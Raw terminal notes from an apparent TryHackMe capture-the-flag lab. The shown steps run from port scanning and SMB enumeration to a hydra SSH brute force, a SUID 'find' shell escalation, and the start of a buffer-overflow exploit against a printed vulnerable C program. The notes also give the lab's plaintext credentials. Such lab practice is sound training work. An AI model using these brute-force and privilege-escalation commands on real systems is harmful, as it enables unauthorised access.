@@ -1,0 +1,814 @@
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.55.146                      
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 13:03 EDT
+Nmap scan report for 10.10.55.146
+Host is up (0.099s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
+  
+  
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.55.146 -p1000-1010                                                                                                                                    1 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 13:07 EDT
+Nmap scan report for 10.10.55.146
+Host is up (0.098s latency).
+
+PORT     STATE  SERVICE
+1000/tcp closed cadlock
+1001/tcp closed webpush
+1002/tcp closed windows-icfw
+1003/tcp closed unknown
+1004/tcp closed unknown
+1005/tcp closed unknown
+1006/tcp closed unknown
+1007/tcp closed unknown
+1008/tcp closed ufsd
+1009/tcp closed unknown
+1010/tcp closed surf
+
+Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L \\10.10.55.146                                                                                                                                    131 ⨯
+Enter WORKGROUP\kali's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+   
+   
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.55.146 -p1-1020 -sC --script=vuln 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 13:21 EDT
+Nmap scan report for 10.10.55.146
+Host is up (0.099s latency).
+Not shown: 1017 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+| smb-vuln-regsvc-dos: 
+|   VULNERABLE:
+|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+|     State: VULNERABLE
+|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+|       while working on smb-enum-sessions.
+|_          
+
+Nmap done: 1 IP address (1 host up) scanned in 54.71 seconds
+ 
+ 
+┌──(kali㉿kali)-[/hackme]
+└─$ enum4linux -R 1000-1003 10.10.55.146 
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 21 13:33:56 2021
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.55.146
+RID Range ........ 1000-1003
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.55.146    |
+ ==================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ===================================== 
+|    Session Check on 10.10.55.146    |
+ ===================================== 
+[+] Server 10.10.55.146 allows sessions using username '', password ''
+
+ =========================================== 
+|    Getting domain SID for 10.10.55.146    |
+ =========================================== 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ =============================================================== 
+|    Users on 10.10.55.146 via RID cycling (RIDS: 1000-1003)    |
+ =============================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-1000 *unknown*\*unknown* (8)
+S-1-5-32-1001 *unknown*\*unknown* (8)
+S-1-5-32-1002 *unknown*\*unknown* (8)
+S-1-5-32-1003 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\kel (Local User)
+S-1-22-1-1001 Unix User\des (Local User)
+S-1-22-1-1002 Unix User\tryhackme (Local User)
+S-1-22-1-1003 Unix User\noentry (Local User)
+[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
+S-1-5-21-2007993849-1719925537-2372789573-1000 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1001 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1002 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1003 *unknown*\*unknown* (8)
+enum4linux complete on Mon Jun 21 13:34:25 2021
+
+
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ enum4linux -a 10.10.55.146 
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 21 13:42:09 2021
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.55.146
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.55.146    |
+ ==================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================ 
+|    Nbtstat Information for 10.10.55.146    |
+ ============================================ 
+Looking up status of 10.10.55.146
+	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
+	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
+	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ===================================== 
+|    Session Check on 10.10.55.146    |
+ ===================================== 
+[+] Server 10.10.55.146 allows sessions using username '', password ''
+
+ =========================================== 
+|    Getting domain SID for 10.10.55.146    |
+ =========================================== 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ====================================== 
+|    OS information on 10.10.55.146    |
+ ====================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.55.146 from smbclient: 
+[+] Got OS info for 10.10.55.146 from srvinfo:
+	THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+ ============================= 
+|    Users on 10.10.55.146    |
+ ============================= 
+Use of uninitialized value $users in print at ./enum4linux.pl line 874.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 888.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
+
+ ========================================= 
+|    Share Enumeration on 10.10.55.146    |
+ ========================================= 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.55.146
+//10.10.55.146/print$	Mapping: DENIED, Listing: N/A
+//10.10.55.146/IPC$	[E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+ ==================================================== 
+|    Password Policy Information for 10.10.55.146    |
+ ==================================================== 
+
+
+[+] Attaching to 10.10.55.146 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+	[+] THM_EXPLOIT
+	[+] Builtin
+
+[+] Password Info for Domain: THM_EXPLOIT
+
+	[+] Minimum password length: 5
+	[+] Password history length: None
+	[+] Maximum password age: 37 days 6 hours 21 minutes 
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: None
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ ============================== 
+|    Groups on 10.10.55.146    |
+ ============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================= 
+|    Users on 10.10.55.146 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================= 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-500 *unknown*\*unknown* (8)
+S-1-5-32-501 *unknown*\*unknown* (8)
+S-1-5-32-502 *unknown*\*unknown* (8)
+S-1-5-32-503 *unknown*\*unknown* (8)
+S-1-5-32-504 *unknown*\*unknown* (8)
+S-1-5-32-505 *unknown*\*unknown* (8)
+S-1-5-32-506 *unknown*\*unknown* (8)
+S-1-5-32-507 *unknown*\*unknown* (8)
+S-1-5-32-508 *unknown*\*unknown* (8)
+S-1-5-32-509 *unknown*\*unknown* (8)
+S-1-5-32-510 *unknown*\*unknown* (8)
+S-1-5-32-511 *unknown*\*unknown* (8)
+S-1-5-32-512 *unknown*\*unknown* (8)
+S-1-5-32-513 *unknown*\*unknown* (8)
+S-1-5-32-514 *unknown*\*unknown* (8)
+S-1-5-32-515 *unknown*\*unknown* (8)
+S-1-5-32-516 *unknown*\*unknown* (8)
+S-1-5-32-517 *unknown*\*unknown* (8)
+S-1-5-32-518 *unknown*\*unknown* (8)
+S-1-5-32-519 *unknown*\*unknown* (8)
+S-1-5-32-520 *unknown*\*unknown* (8)
+S-1-5-32-521 *unknown*\*unknown* (8)
+S-1-5-32-522 *unknown*\*unknown* (8)
+S-1-5-32-523 *unknown*\*unknown* (8)
+S-1-5-32-524 *unknown*\*unknown* (8)
+S-1-5-32-525 *unknown*\*unknown* (8)
+S-1-5-32-526 *unknown*\*unknown* (8)
+S-1-5-32-527 *unknown*\*unknown* (8)
+S-1-5-32-528 *unknown*\*unknown* (8)
+S-1-5-32-529 *unknown*\*unknown* (8)
+S-1-5-32-530 *unknown*\*unknown* (8)
+S-1-5-32-531 *unknown*\*unknown* (8)
+S-1-5-32-532 *unknown*\*unknown* (8)
+S-1-5-32-533 *unknown*\*unknown* (8)
+S-1-5-32-534 *unknown*\*unknown* (8)
+S-1-5-32-535 *unknown*\*unknown* (8)
+S-1-5-32-536 *unknown*\*unknown* (8)
+S-1-5-32-537 *unknown*\*unknown* (8)
+S-1-5-32-538 *unknown*\*unknown* (8)
+S-1-5-32-539 *unknown*\*unknown* (8)
+S-1-5-32-540 *unknown*\*unknown* (8)
+S-1-5-32-541 *unknown*\*unknown* (8)
+S-1-5-32-542 *unknown*\*unknown* (8)
+S-1-5-32-543 *unknown*\*unknown* (8)
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+S-1-5-32-1000 *unknown*\*unknown* (8)
+S-1-5-32-1001 *unknown*\*unknown* (8)
+S-1-5-32-1002 *unknown*\*unknown* (8)
+S-1-5-32-1003 *unknown*\*unknown* (8)
+S-1-5-32-1004 *unknown*\*unknown* (8)
+S-1-5-32-1005 *unknown*\*unknown* (8)
+S-1-5-32-1006 *unknown*\*unknown* (8)
+S-1-5-32-1007 *unknown*\*unknown* (8)
+S-1-5-32-1008 *unknown*\*unknown* (8)
+S-1-5-32-1009 *unknown*\*unknown* (8)
+S-1-5-32-1010 *unknown*\*unknown* (8)
+S-1-5-32-1011 *unknown*\*unknown* (8)
+S-1-5-32-1012 *unknown*\*unknown* (8)
+S-1-5-32-1013 *unknown*\*unknown* (8)
+S-1-5-32-1014 *unknown*\*unknown* (8)
+S-1-5-32-1015 *unknown*\*unknown* (8)
+S-1-5-32-1016 *unknown*\*unknown* (8)
+S-1-5-32-1017 *unknown*\*unknown* (8)
+S-1-5-32-1018 *unknown*\*unknown* (8)
+S-1-5-32-1019 *unknown*\*unknown* (8)
+S-1-5-32-1020 *unknown*\*unknown* (8)
+S-1-5-32-1021 *unknown*\*unknown* (8)
+S-1-5-32-1022 *unknown*\*unknown* (8)
+S-1-5-32-1023 *unknown*\*unknown* (8)
+S-1-5-32-1024 *unknown*\*unknown* (8)
+S-1-5-32-1025 *unknown*\*unknown* (8)
+S-1-5-32-1026 *unknown*\*unknown* (8)
+S-1-5-32-1027 *unknown*\*unknown* (8)
+S-1-5-32-1028 *unknown*\*unknown* (8)
+S-1-5-32-1029 *unknown*\*unknown* (8)
+S-1-5-32-1030 *unknown*\*unknown* (8)
+S-1-5-32-1031 *unknown*\*unknown* (8)
+S-1-5-32-1032 *unknown*\*unknown* (8)
+S-1-5-32-1033 *unknown*\*unknown* (8)
+S-1-5-32-1034 *unknown*\*unknown* (8)
+S-1-5-32-1035 *unknown*\*unknown* (8)
+S-1-5-32-1036 *unknown*\*unknown* (8)
+S-1-5-32-1037 *unknown*\*unknown* (8)
+S-1-5-32-1038 *unknown*\*unknown* (8)
+S-1-5-32-1039 *unknown*\*unknown* (8)
+S-1-5-32-1040 *unknown*\*unknown* (8)
+S-1-5-32-1041 *unknown*\*unknown* (8)
+S-1-5-32-1042 *unknown*\*unknown* (8)
+S-1-5-32-1043 *unknown*\*unknown* (8)
+S-1-5-32-1044 *unknown*\*unknown* (8)
+S-1-5-32-1045 *unknown*\*unknown* (8)
+S-1-5-32-1046 *unknown*\*unknown* (8)
+S-1-5-32-1047 *unknown*\*unknown* (8)
+S-1-5-32-1048 *unknown*\*unknown* (8)
+S-1-5-32-1049 *unknown*\*unknown* (8)
+S-1-5-32-1050 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
+S-1-5-21-2007993849-1719925537-2372789573-500 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\nobody (Local User)
+S-1-5-21-2007993849-1719925537-2372789573-502 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-503 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-504 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-505 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-506 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-507 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-508 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-509 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-510 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-511 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-512 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\None (Domain Group)
+S-1-5-21-2007993849-1719925537-2372789573-514 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-515 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-516 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-517 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-518 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-519 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-520 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-521 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-522 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-523 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-524 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-525 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-526 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-527 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-528 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-529 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-530 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-531 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-532 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-533 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-534 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-535 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-536 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-537 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-538 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-539 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-540 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-541 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-542 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-543 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-544 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-545 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-546 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-547 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-548 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-549 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-550 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1000 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1001 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1002 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1003 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1004 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1005 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1006 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1007 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1008 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1009 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1010 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1011 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1012 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1013 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1014 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1015 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1016 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1017 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1018 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1019 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1020 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1021 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1022 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1023 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1024 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1025 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1026 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1027 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1028 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1029 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1030 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1031 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1032 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1033 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1034 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1035 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1036 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1037 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1038 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1039 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1040 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1041 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1042 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1043 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1044 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1045 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1046 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1047 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1048 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1049 *unknown*\*unknown* (8)
+S-1-5-21-2007993849-1719925537-2372789573-1050 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\kel (Local User)
+S-1-22-1-1001 Unix User\des (Local User)
+S-1-22-1-1002 Unix User\tryhackme (Local User)
+S-1-22-1-1003 Unix User\noentry (Local User)
+
+ ============================================= 
+|    Getting printer info for 10.10.55.146    |
+ ============================================= 
+No printers returned.
+
+
+enum4linux complete on Mon Jun 21 13:49:36 2021
+
+
+
+
+
+
+
+
+                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ hydra -l tryhackme -P /usr/share/wordlists/rockyou500.txt 10.10.55.146 ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-21 13:49:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
+[DATA] attacking ssh://10.10.55.146:22/
+[STATUS] 193.00 tries/min, 193 tries in 00:01h, 324 to do in 00:02h, 16 active
+[STATUS] 138.50 tries/min, 277 tries in 00:02h, 244 to do in 00:02h, 16 active
+[STATUS] 125.00 tries/min, 375 tries in 00:03h, 150 to do in 00:02h, 16 active
+[STATUS] 130.25 tries/min, 521 tries in 00:04h, 4 to do in 00:01h, 16 active
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-21 13:54:27
+                                
+                                
+                                
+┌──(kali㉿kali)-[~]
+└─$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt 10.10.55.146 ssh 
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-21 13:55:12
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ssh://10.10.55.146:22/
+[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344222 to do in 1328:11h, 16 active
+[STATUS] 128.33 tries/min, 385 tries in 00:03h, 14344017 to do in 1862:52h, 16 active
+[STATUS] 117.14 tries/min, 820 tries in 00:07h, 14343582 to do in 2040:46h, 16 active
+[22][ssh] host: 10.10.55.146   login: tryhackme   password: thebest
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 4 final worker threads did not complete until end.
+[ERROR] 4 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-21 14:02:42
+ 
+tryhackme:thebest
+
+ssh in, looking for /home/des/flag.txt
+
+tried privesc, 
+
+hydra into des maybe, 
+
+
+
+gtfo find 
+
+
+tryhackme@THM_exploit:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
+$ whoami
+des
+$ cat /home/des/flag.txt
+Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.
+
+You flag is THM{exploit_the_SUID}
+
+login crdential (In case you need it)
+
+username: des
+password: destructive_72656275696c64
+
+
+
+des:destructive_72656275696c64
+
+
+
+sudo xfreerdp /u:des /p:destructive_72656275696c64 /v:10.10.55.146  	didn't work
+
+
+remmina
+ 
+
+scp des@10.1055146:/home/des/bof .
+
+
+
+so we are supposed to run the exe in the ssh 
+
+
+run < <(python -c 'print("A"*1000)')
+
+
+
+
+
+
+#include <stdio.h>
+#include <unistd.h>
+
+int foo(){
+	char buffer[600];
+	int characters_read;
+	printf("Enter some string:\n");
+	characters_read = read(0, buffer, 1000);
+	printf("You entered: %s", buffer);
+	return 0;
+}
+
+void main(){
+	setresuid(geteuid(), geteuid(), geteuid());
+    	setresgid(getegid(), getegid(), getegid());
+
+	foo();
+}
+
+
+600 + 400 = 1000  bytes
+
+1000 pattern
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+
+rbp offset
+0x4134754133754132
+
+
